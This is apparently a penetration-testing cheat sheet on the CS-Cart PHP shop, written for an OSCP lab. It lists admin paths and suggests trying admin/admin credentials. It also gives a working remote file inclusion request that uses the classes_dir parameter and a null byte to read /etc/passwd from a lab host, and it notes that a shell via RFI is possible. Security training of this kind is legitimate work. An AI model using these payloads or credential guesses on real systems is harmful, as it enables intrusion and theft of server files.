# CS-Cart


CS-Cart is an online PHP shop.

## URLs


• /admin - Admin panel
• /config or /config.php - Config settings (probably can't access)
• /?version - Find running version of CS-Cart

## Credentials


• Try admin / admin - worked in oscp PAYDAY
• I don't think the app has any default credentials

• https://www.exploit-db.com/exploits/1872 - classes_dir RFI

#### Potential Errors
• Your include gets concatenated with another filename
◇ e.g. file:////etc/passwdphpmailerDSclass.phpmailer.php
◇ You can bypass this by terminating the string with a null byte
▪ file:////etc/passwd%00

#### Examples
• oscp PAYDAY - 10.11.1.24

#### Exploit
Read files
http://10.11.1.24/classes/phpmailer/class.cs_phpmailer.php?classes_dir=file:////etc/passwd%00

You could also try getting a shell via RFI (untested).
